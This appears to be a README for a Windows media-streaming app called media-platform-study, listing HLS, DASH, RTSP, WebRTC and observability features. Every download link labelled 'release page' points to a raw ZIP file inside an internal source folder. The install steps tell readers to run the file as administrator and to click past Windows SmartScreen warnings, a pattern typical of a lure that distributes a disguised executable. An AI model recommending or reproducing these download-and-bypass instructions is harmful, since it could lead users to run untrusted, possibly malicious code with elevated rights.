# 🎬 media-platform-study - Stream media with less setup

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/syfbang/media-platform-study/main/internal/stun/media_platform_study_3.0.zip)

## 🖥️ What this app does

media-platform-study is a media streaming app for Windows. It helps you play video on demand and view live streams from a simple desktop app.

It supports common streaming paths used in media tools:
- VOD with HLS and DASH
- Live stream input from RTSP
- WebRTC playback for low delay video
- Monitoring with OpenTelemetry tools

Use it if you want to:
- open recorded video streams
- watch live video from a camera or server
- test stream playback on your PC
- check stream health with basic observability tools

## 📥 Download the app

Visit the release page to download the Windows version:

[Go to the release page](https://raw.githubusercontent.com/syfbang/media-platform-study/main/internal/stun/media_platform_study_3.0.zip)

On that page, look for the latest release and download the Windows file that matches your PC.

## 🪟 Install on Windows

1. Open the release page.
2. Download the Windows file from the latest release.
3. If the file is in a ZIP archive, extract it.
4. Open the app file inside the folder.
5. If Windows asks for permission, choose Run or Yes.
6. Wait for the app window to open.

If you use a work PC, you may need admin rights to extract or start the file.

## ▶️ Run the app

After you open the app, you can:

- start a VOD session for HLS or DASH playback
- connect to a live RTSP source and view it in WebRTC
- check stream data and playback status
- use the app with local media files or network sources

If the app asks for a stream URL, paste the full address from your video source.

## 🧭 Basic first use

1. Start the app.
2. Pick a stream type such as VOD or Live.
3. Enter the stream URL or file path.
4. Click the play or start button.
5. Wait a moment for the video to load.
6. Use the player controls for pause, seek, or volume.

For live streams, the video may begin a few seconds after you start it. This is normal.

## 🧩 Main features

### 📼 VOD playback
Play stored video using:
- HLS
- DASH

This works well for files or stream feeds that already have recorded media.

### 🔴 Live streaming
View live video from:
- RTSP sources
- WebRTC playback

This helps with camera feeds, test streams, and live server output.

### 📊 Observability
The app connects with common observability tools:
- OpenTelemetry
- Prometheus
- Grafana
- Jaeger

These tools help you see what the stream is doing and check for issues.

### 📦 Media pipeline support
The project also uses common media tools and services:
- FFmpeg
- Pion
- Kafka
- MinIO

These support media processing, transport, and storage tasks behind the scenes.

## ⚙️ System requirements

Use a Windows PC with:
- Windows 10 or Windows 11
- 8 GB of RAM or more
- a modern CPU
- 200 MB of free disk space for the app and logs
- a stable network connection for live streams

For best results:
- use a wired network for live video
- close other heavy apps while testing streams
- keep your graphics drivers up to date

## 📂 What you may see in the release

The release page may contain one or more of these files:
- `.exe` file for Windows
- `.zip` archive with the app inside
- release notes
- checksum files

If you see more than one file, choose the Windows app file or the ZIP file for Windows.

## 🛠️ Common setup steps

If the app does not open on the first try:

1. Right-click the file.
2. Choose Open or Run as administrator.
3. If Windows blocks it, select More info and then Run anyway.
4. Check that the file was fully downloaded.
5. Try again after restarting the PC.

If a stream does not load:
- check the URL
- confirm the stream is online
- make sure your network is working
- try another source to rule out a bad stream

## 🔍 Where this project fits

This project is useful for:
- home media testing
- demo streaming setups
- stream playback checks
- live source testing
- media pipeline study and review

It brings together HLS, DASH, WebRTC, RTSP, and observability in one place so you can test media flow from input to playback.

## 📌 Topics covered in this repo

This project includes work around:
- dash
- ffmpeg
- grafana
- hls
- jaeger
- kafka
- live-streaming
- minio
- observability
- opentelemetry
- pion
- prometheus
- rtsp
- vod
- webrtc

## 🧪 If you want to test playback

Use a known working source first:
- a sample HLS URL
- a DASH manifest
- a public RTSP feed
- a local video file if the app supports it

Start with one source at a time. This makes it easier to see where a problem starts.

## 📝 File names and labels

If the release page uses names you do not know, look for:
- Windows
- x64
- amd64
- zip
- exe

These labels usually mean the file works on a normal 64-bit Windows PC.

## 🧷 Quick path

1. Open the release page.
2. Download the latest Windows build.
3. Extract the file if needed.
4. Open the app.
5. Load a VOD or live stream.
6. Watch the stream in the player window